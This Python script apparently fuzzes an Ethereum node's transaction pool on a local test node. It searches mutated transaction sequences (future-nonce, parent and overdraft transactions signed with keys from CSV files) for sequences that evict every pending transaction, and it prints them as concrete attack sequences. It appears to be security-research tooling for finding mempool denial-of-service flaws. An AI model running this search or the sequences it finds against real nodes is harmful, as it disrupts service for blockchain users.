
import copy
import sys
import os
import time

import web3
import numpy as np
import pandas as pd
from web3 import Web3
from helper import sendTxs,ClearPool,CheckTxinpool
import graphviz
   
future_flag = True
global_label = 0
target_URL = "http://127.0.0.1:18546"
mpool = Web3(Web3.HTTPProvider(target_URL))

txpool_size = 16
future_slots = 4
number_per_sender = 2
# web3 instance
w3 = Web3(Web3.HTTPProvider(target_URL))
w3_local = w3
trace_path = './key_prive2.csv'
trace = pd.read_csv(trace_path)
key_dict= {}

accounts2=w3.eth.accounts
for j in range(len(trace)):
    line = trace.iloc[j]
    key_dict[Web3.to_checksum_address(line['pub_key'])] = line['priv_key']


accounts = list(key_dict.keys())
nonces = [0]*len(accounts)
account_index = 0
accountIndex_dict = {}
acc_index = 0

trace_path = './key_prive.csv'
trace = pd.read_csv(trace_path)
for j in range(len(trace)):
    line = trace.iloc[j]
    if Web3.to_checksum_address(line['pub_key']) not in key_dict:
        key_dict[Web3.to_checksum_address(line['pub_key'])] = line['priv_key']
for acc in accounts:
    accountIndex_dict[acc] = acc_index
    acc_index += 1



class Tx:
    def __init__(self, account_index,sender, nonce,price,value,tx_hash=None):
        self.account_index = account_index
        self.sender = sender
        self.nonce = nonce
        self.value = 1
        self.price = price
        self.value = value
        self.tx_hash = tx_hash

class Input:
    def __init__(self, tx_sequence, indexs):
        self.tx_sequence = tx_sequence
        self.indexs = indexs

def resetAndinitial():
    global account_index
    global nonces
    global txpool_size
    account_index = 0
    nonces = [0]*len(accounts)

    ClearPool(target_URL)

    counter = 0
    number_per_sender = 1
    for i in range(txpool_size):
        if counter >= txpool_size:
            break
        for k in range(number_per_sender):
            send(accounts2[i], accounts2[i], k, 3, 1, key_dict[accounts2[i]])
            counter += 1
            if counter >= txpool_size:
                break


def send(from_, to_, nonce_, price_, value_,p_key):
    tx_hash = sign_send_transfer_tx(w3_local, from_, to_, price_, value_, nonce_, p_key)
    return tx_hash

def resend(tx):
    global nonces
    send(tx.sender, tx.sender, tx.nonce, tx.price, tx.value, key_dict[tx.sender])
    #print("resending",tx.nonce)
    if tx.nonce != 10000:
        nonces[tx.account_index] = tx.nonce + 1

def sign_send_transfer_tx(_w3, from_, to_, price, value, nonce, sk):
    transaction={'to':to_, 'from':from_, 'value': value, 'gas':21000, 'gasPrice':price, 'nonce':nonce,'chainId': 20191003}
    signed = _w3.eth.account.sign_transaction(transaction, sk)
    try:
        return _w3.eth.send_raw_transaction(signed.rawTransaction).hex()
    except OSError as err:
        print("OS error: {0}".format(err))
    except ValueError as err:
        return format(err).split("\'")[5]
    except:
        print("Unexpected error:", sys.exc_info()[0])
        raise

def generate_future(price):
    global account_index
    account_index += 1
    tx = Tx(account_index,accounts[account_index], 10000, price,2)
    return tx


def execute(mpool, input,state):
    global account_index
    global txpool_size
    if state == None:
        resetAndinitial()
        account_index = 0
        if future_flag:
            for i in range(future_slots):
                new_tx = generate_future(12000)
                resend(new_tx)
        tx_sequence = input.tx_sequence
        for i in range(len(tx_sequence)):
            new_tx = tx_sequence[i]
            resend(new_tx)
        txpool = w3_local.geth.txpool.content()

        return txpool
    else:
        ClearPool(target_URL)
        symbol = getSymbolicPoolState(state)
        normal_number = symbol.count('N')
        future_number = symbol.count('F')
        counter = 0
        number_per_sender = 1
        for i in range(normal_number):
            if counter >= normal_number:
                break
            for j in range(number_per_sender):
                send(accounts2[i], accounts2[i], j, 3, 1, key_dict[accounts2[i]])
                counter += 1
                if counter >= normal_number:
                    break
        account_index = 0
        if future_flag:
            for i in range(future_number):
                new_tx = generate_future(12000)
                resend(new_tx)
        tx_sequence = input.tx_sequence
        tx_indexs = input.indexs
        tx_indexs.sort()
        for i in tx_indexs:
            resend(tx_sequence[i])
        if len(tx_sequence) > 1:
            new_tx = tx_sequence[-1]
            resend(new_tx)
        txpool = w3_local.geth.txpool.content()
        return txpool

def generate_parent(price):
    global account_index
    account_index += 1
    tx = Tx(account_index,accounts[account_index], nonces[account_index], price,21000*(12000-price))
    nonces[account_index] += 1
    return tx

def getPendingNumber(txpool):
    pending_number = 0
    for sender in txpool['pending'].keys():
        pending_number += len(txpool['pending'][sender].keys())
    return pending_number


def is_exploit(state):
    txpool = state
    pending_number = getPendingNumber(txpool)
    if pending_number == 0:
        return True
    else:
        return False
def mutate(input, state):
    txpool = state
    input_list = []
    global account_index
    global global_label
    parentInPool_sender = []
    parentInPool_nextNonce = []
    parentInPool_accountIndex = []
    parentInPool_price = []
    alltxInPool = []
    if txpool != None:
        for sender in txpool['pending'].keys():
            first_tx = txpool['pending'][sender]['0']
            first_price = int(first_tx['gasPrice'], 16)
            if first_price != 3:
                parentInPool_sender.append(sender)
                parentInPool_nextNonce.append(len(txpool['pending'][sender]))
                parentInPool_price.append(first_price)
                for nonce in txpool['pending'][sender]:
                    alltxInPool.append([sender,int(nonce),int(txpool['pending'][sender][nonce]['value'],16)])
        for sender in txpool['queued'].keys():
            for nonce in txpool['queued'][sender]:
                if int(nonce) != 10000:
                    alltxInPool.append([sender, int(nonce), int(txpool['queued'][sender][nonce]['value'],16)])
    state_inputindex = []

    for ele in alltxInPool:
        for i in range(len(input.tx_sequence)):
            if input.tx_sequence[i].sender == ele[0] and input.tx_sequence[i].nonce == ele[1] and input.tx_sequence[i].value == ele[2]:
                state_inputindex.append(i)
    parentPrice_list = []
    parentSender_list = []
    parentIndex_list = []
    inputtx_list = copy.deepcopy(input.tx_sequence)
    next_acc_index = 5121
    for tx in inputtx_list:
        if tx.nonce == 0:
            parentPrice_list.append(tx.price)
            parentSender_list.append(tx.sender)
            parentIndex_list.append(tx.account_index)
            if tx.account_index > next_acc_index:
                next_acc_index = tx.account_index
    parentPrice_list.sort()

    next_acc_index += 1
    for sender in parentInPool_sender:
        acc_index = accountIndex_dict[sender]

        parentInPool_accountIndex.append(acc_index)




    for i in range(len(parentInPool_sender)):
        account_index = parentInPool_accountIndex[i]

        new_tx = Tx(account_index, parentInPool_sender[i], parentInPool_nextNonce[i], 12000,
                    1000000000000000 - 21000 * 12000 - 100)
        newinput1 = copy.deepcopy(input.tx_sequence)
        newinput1.append(new_tx)
        input_list.append(Input(newinput1,state_inputindex))
        #print("adding a O")
        new_tx2 = Tx(account_index, parentInPool_sender[i], parentInPool_nextNonce[i], 12000, 10000)
        newinput2 = copy.deepcopy(input.tx_sequence)
        newinput2.append(new_tx2)
        input_list.append(Input(newinput2,state_inputindex))
        #print("adding a C")
    step_length = 2
    max_index = -1
    for i in range(len(parentInPool_price)):
        price_list = []
        cur_tx_index = 0
        for j in range(len(parentPrice_list) + 1):
            if j < len(parentPrice_list) and parentPrice_list[j] == parentInPool_price[i]:
                cur_tx_index = j
                if cur_tx_index > max_index:
                    max_index = cur_tx_index
            price_list.append(3 + 1 + j * step_length)
        new_tx = Tx(next_acc_index, accounts[next_acc_index], 0, 3 + 1 + cur_tx_index * step_length,
                    21000 * (12000 - (3 + 1 + cur_tx_index * step_length)))
        price_list.remove(3 + 1 + cur_tx_index * step_length)
        newinput3 = copy.deepcopy(input.tx_sequence)
        for tx in newinput3:
            if tx.nonce == 0:
                temp_price = tx.price
                index = parentPrice_list.index(temp_price)
                cur_price = price_list[index]
                tx.price = cur_price
        newinput3.append(new_tx)
        input_list.append(Input(newinput3,state_inputindex))

    if max_index != -1:
        max_index += 1
        new_tx4 = Tx(next_acc_index, accounts[next_acc_index], 0, 3 + 1 + max_index * step_length,
                    21000 * (12000 - (3 + 1 + max_index * step_length)))
        price_list = []
        for j in range(len(parentPrice_list) + 1):
            price_list.append(3 + 1 + j * step_length)
        price_list.remove(3 + 1 + max_index * step_length)
        newinput4 = copy.deepcopy(input.tx_sequence)
        for tx in newinput4:
            if tx.nonce == 0:
                temp_price = tx.price
                index = parentPrice_list.index(temp_price)
                cur_price = price_list[index]
                tx.price = cur_price
        newinput4.append(new_tx4)
        input_list.append(Input(newinput4,state_inputindex))


    if len(parentInPool_price) == 0:
        account_index = 5121
        parent_price = 4
        new_tx = generate_parent(parent_price)
        newinput = copy.deepcopy(input.tx_sequence)
        newinput.append(new_tx)
        input_list.append(Input(newinput,[0]))
    return input_list

def parseInput(input):
    output = ""
    sender_nonce_dict = {}
    for tx in input:
        if tx.nonce == 0:
            output += "P"
            sender_nonce_dict[tx.sender] = 0
        elif tx.sender in sender_nonce_dict and tx.nonce <= sender_nonce_dict[tx.sender] + 1:
            if tx.value <= 10000:
                output += "C"
            else:
                output += "O"
            sender_nonce_dict[tx.sender] = tx.nonce
    return output

def getSymbolicPoolState(txpool):
    normalNumber = 0
    futureNumber = 0
    pendingNumber = 0
    senderlist = []
    global state_symbol
    state_symbol = ""
    for sender in txpool['queued'].keys():
        futureNumber += len(txpool['queued'][sender].keys())
    for sender in txpool['pending'].keys():
        first_tx = txpool['pending'][sender]['0']
        first_price = int(first_tx['gasPrice'], 16)
        if first_price == 3:
            normalNumber += 1
        else:
            senderlist.append(SenderParent(sender, first_price))
        pendingNumber += len(txpool['pending'][sender].keys())
    emptyNumber = txpool_size - futureNumber - pendingNumber
    state_symbol += "N"* normalNumber
    senderlist.sort(key=lambda x: x.parentPrice)
    for senderEle in senderlist:
        for nonce in txpool['pending'][senderEle.sender].keys():

            item = txpool['pending'][senderEle.sender][nonce]
            if nonce == "0":
                state_symbol += "P"
            elif int(item['value'], 16) == 10000:
                state_symbol += "C"
            elif int(item['value'], 16) > 10000:
                state_symbol += "O"

    state_symbol = "E" * emptyNumber + state_symbol
    state_symbol = "F" * futureNumber + state_symbol
    return state_symbol

def getOutputEngergy(txpool):
    attack_parent = 0
    engergy = 0
    for sender in txpool['pending'].keys():
        first_tx = txpool['pending'][sender]['0']
        first_price = int(first_tx['gasPrice'], 16)
        if first_price != 3:
            attack_parent += 1
            for nonce in txpool['pending'][sender].keys():
                item = txpool['pending'][sender][nonce]
                if int(item.value, 16) > 10000:
                    continue
                else:
                    engergy += 1
        else:
            engergy += 3
    for i in range(attack_parent):
        engergy += (4 + i)
    return engergy


class SenderParent:
    def __init__(self, sender,parentPrice):
        self.sender = sender
        self.parentPrice = parentPrice

class Seed:
    def __init__(self,input,state):
        self.input = input
        self.state = state
        self.symbol = None
        self.label = ""
        self.engergy = 10000
class Sdb:
    def __init__(self):
        self.sdb = []
        new_seed = Seed(Input([],[]),None)
        self.sdb.append(new_seed)

    def is_empty(self):
        self.sdb.sort(key=lambda x: x.engergy)
        if self.sdb[0].engergy == sys.maxsize:
            return True
        else:
            return False
    def add(self,st2, in2,label):
        new_seed = Seed(in2,st2)
        state_symbol = getSymbolicPoolState(st2)
        new_seed.symbol = state_symbol
        new_energy = getOutputEngergy(st2)
        new_seed.engergy = new_energy
        new_seed.label = label
        self.sdb.append(new_seed)

    def next(self):
        ele = self.sdb[0]
        ele.engergy = sys.maxsize
        return ele.state, ele.input
    def covers(self,state):
        txpool = state
        state_symbol = getSymbolicPoolState(txpool)
        for seed in self.sdb:
            if seed.symbol == state_symbol:
                return True
        return False

def concreteInput(input):
    output = []

    for tx in input:
        tx_string = ""
        tx_string += "from: "+ str(tx.sender)
        tx_string += ", to: " + str(accounts2[0])
        tx_string += ", nonce: " + str(tx.nonce)
        tx_string += ", price: " + str(tx.price)
        tx_string += ", value: " + str(tx.value)
        output.append(tx_string)
    return output


start_time = time.time()
total_time = 8*60
total_time = total_time*60
sdb = Sdb()
exploit_number = 0
find_firstone = False
while not sdb.is_empty():
    if find_firstone == True:
        break
    st1, in1 = sdb.next()
    seed_symbol = None
    if st1 != None:
        seed_symbol = getSymbolicPoolState(st1)
    in2s = mutate(in1, st1)

    for in2 in in2s:
        st2 = execute(mpool, in2,st1)
        parsed_input = parseInput(in2.tx_sequence)

        st2_symbol = getSymbolicPoolState(st2)
        if is_exploit(st2):
            concrete_input = concreteInput(in2.tx_sequence)
            end_time = time.time()
            print("Found an exploit: ", "Symbolized input transaction sequence: ",parsed_input, "Concrete attack transaction sequence: ",concrete_input, "time used: ", end_time-start_time)
            exploit_number += 1
            find_firstone = True
            continue
        else:
            if not sdb.covers(st2):
                sdb.add(st2, in2,getSymbolicPoolState(st2))
            else:
                continue

end_time = time.time()
print("total time: ", end_time-start_time)
print("total exploits found: ", exploit_number)
print("state number: ", len(sdb.sdb))